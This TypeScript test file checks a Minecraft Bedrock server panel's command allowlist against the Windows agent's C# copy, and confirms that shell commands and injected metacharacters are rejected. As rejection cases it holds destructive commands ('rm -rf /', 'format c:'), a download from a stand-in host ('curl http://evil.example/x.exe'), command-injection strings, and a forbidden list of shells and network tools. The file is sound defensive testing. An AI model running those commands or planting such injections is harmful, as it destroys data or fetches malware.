import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';
import { ALLOWED_BDS_COMMANDS, isAllowedBdsCommand } from '../src/commands';

/**
 * The console allowlist exists in TWO places, in two languages:
 *
 *   - `packages/shared/src/commands.ts`  → checked by the web control plane
 *   - `ServerProcessManager.AllowedCommands` (C#) → checked again by the agent
 *
 * Defence in depth only works if the two agree. If they drift, one of two bad
 * things happens: the panel offers a command the node will refuse (confusing),
 * or — far worse — the panel refuses a command that would have been safe, and
 * nobody notices because nothing errors.
 *
 * So this test reads the C# source directly and fails on any drift. It is the
 * only thing keeping the two lists honest, because no single runtime ever
 * exercises both.
 */
const AGENT_SOURCE = fileURLToPath(
  new URL(
    '../../../services/windows-agent/src/OGHost.Agent/Services/ServerProcessManager.cs',
    import.meta.url,
  ),
);

function agentAllowedCommands(): Set<string> {
  const source = readFileSync(AGENT_SOURCE, 'utf8');
  const start = source.indexOf('AllowedCommands = new');
  expect(start, 'AllowedCommands set not found in the agent source').toBeGreaterThan(-1);

  const end = source.indexOf('};', start);
  expect(end, 'AllowedCommands set is not terminated').toBeGreaterThan(start);

  const block = source.slice(start, end);
  const names = [...block.matchAll(/"([a-zA-Z]+)"/g)].map((m) => m[1].toLowerCase());
  expect(names.length, 'no command names parsed out of the agent source').toBeGreaterThan(0);
  return new Set(names);
}

describe('allowlist mirror between the web panel and the Windows agent', () => {
  it('lists exactly the same commands on both sides', () => {
    const agent = agentAllowedCommands();
    const web = new Set(ALLOWED_BDS_COMMANDS.map((c) => c.toLowerCase()));

    const onlyInWeb = [...web].filter((c) => !agent.has(c)).sort();
    const onlyInAgent = [...agent].filter((c) => !web.has(c)).sort();

    expect(
      { onlyInWeb, onlyInAgent },
      'The two allowlists drifted. Fix the list that is wrong, then update this expectation.',
    ).toEqual({ onlyInWeb: [], onlyInAgent: [] });
  });

  it('contains no duplicates', () => {
    const seen = new Set<string>();
    const duplicates: string[] = [];
    for (const command of ALLOWED_BDS_COMMANDS) {
      if (seen.has(command)) duplicates.push(command);
      seen.add(command);
    }
    expect(duplicates, 'duplicate entries hide real ones during review').toEqual([]);
  });

  it('never allowlists a shell or an OS executable', () => {
    // If someone ever adds one of these, remote shell access exists and the
    // entire security model of the project collapses. Fail loudly.
    const forbidden = [
      'cmd', 'powershell', 'pwsh', 'bash', 'sh', 'zsh', 'exec', 'system',
      'start', 'run', 'invoke', 'curl', 'wget', 'rm', 'del', 'erase',
      'format', 'reg', 'net', 'sc', 'taskkill', 'shutdown', 'echo',
    ];
    const web = ALLOWED_BDS_COMMANDS.map((c) => c.toLowerCase());
    const agent = [...agentAllowedCommands()];

    for (const name of forbidden) {
      expect(web, `web allowlist must never contain "${name}"`).not.toContain(name);
      expect(agent, `agent allowlist must never contain "${name}"`).not.toContain(name);
    }
  });

  it('covers the commands a player actually needs from a phone', () => {
    // These are the day-to-day ones. Losing any of them is a usability
    // regression that is easy to introduce by accident while editing a list.
    const essentials = [
      'list', 'say', 'stop', 'save', 'kick', 'ban', 'pardon', 'op', 'deop',
      'gamemode', 'difficulty', 'time', 'weather', 'tp', 'give', 'gamerule',
      'allowlist', 'whitelist', 'title', 'kill',
    ];
    const web = new Set(ALLOWED_BDS_COMMANDS.map((c) => c.toLowerCase()));
    for (const name of essentials) {
      expect(web.has(name), `essential command "${name}" missing from the web allowlist`).toBe(true);
    }
  });
});

describe('isAllowedBdsCommand', () => {
  it.each([
    'list',
    'say hello world',
    'difficulty hard',
    'gamemode creative Steve',
    'tp @a 100 64 200',
    'save hold',
    'stop',
    'allowlist add Notch',
    'kick Steve AFK',
    'gamerule doDaylightCycle false',
    '  list  ',
  ])('accepts the allowlisted command %j', (command) => {
    expect(isAllowedBdsCommand(command)).toBe(true);
  });

  it.each(['SAY hello', 'LiSt', 'Stop', 'GAMEMODE creative'])('is case-insensitive on the head: %j', (command) => {
    expect(isAllowedBdsCommand(command)).toBe(true);
  });

  it.each(['', '   ', '\n', '\t'])( 'rejects blank input %j', (command) => {
    expect(isAllowedBdsCommand(command)).toBe(false);
  });

  it.each([
    'dir', 'powershell', 'cmd', 'rm -rf /', 'del C:\\Windows', 'format c:',
    'curl http://evil.example/x.exe', 'Invoke-WebRequest', 'notacommand foo',
  ])('rejects the non-Bedrock command %j', (command) => {
    expect(isAllowedBdsCommand(command)).toBe(false);
  });

  it.each([
    'say hello & calc.exe',
    'say hello; rm -rf /',
    'say hello | whoami',
    'say `id`',
    'say $(whoami)',
    'say a > b',
    'say a < b',
    'say line1\nstop',
    'say line1\r\nstop',
  ])('rejects shell metacharacters even under an allowed head: %j', (command) => {
    expect(isAllowedBdsCommand(command)).toBe(false);
  });

  it('rejects a metacharacter anywhere in the string, not just after the head', () => {
    expect(isAllowedBdsCommand('say hello')).toBe(true);
    expect(isAllowedBdsCommand('say hello;stop')).toBe(false);
    expect(isAllowedBdsCommand('say ; hello')).toBe(false);
  });

  it('matches the agent on every command the agent tests exercise', () => {
    // The C# suite asserts these specific strings. If the two implementations
    // ever disagree on one of them, one side is wrong.
    const agent = agentAllowedCommands();
    for (const command of ALLOWED_BDS_COMMANDS) {
      expect(isAllowedBdsCommand(`${command} arg`)).toBe(true);
      expect(agent.has(command.toLowerCase())).toBe(true);
    }
  });
});
